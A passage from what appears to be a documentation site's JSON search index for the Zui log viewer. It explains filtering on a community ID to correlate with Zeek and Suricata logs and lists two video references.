id</code> which you can use to correlate with Zeek and Suricata logs.</p> <p></p> <p>Filter on the <code>community id</code> by right-clicking it and selecting <code>Filter == value</code></p> <p>Delete <code>event type</code> on the search bar to focus on <code>community id</code></p> <p></p>"},{"location":"zui/zui.html#references","title":"References","text":"<ul> <li>https://youtu.be/eMzljqxASVA?si=ph2fV-LK7amul5SH</li> <li>https://youtu.be/bba9l4Ianbs?si=VzSKPUHI23ohdmdZ</li> </ul>"}]}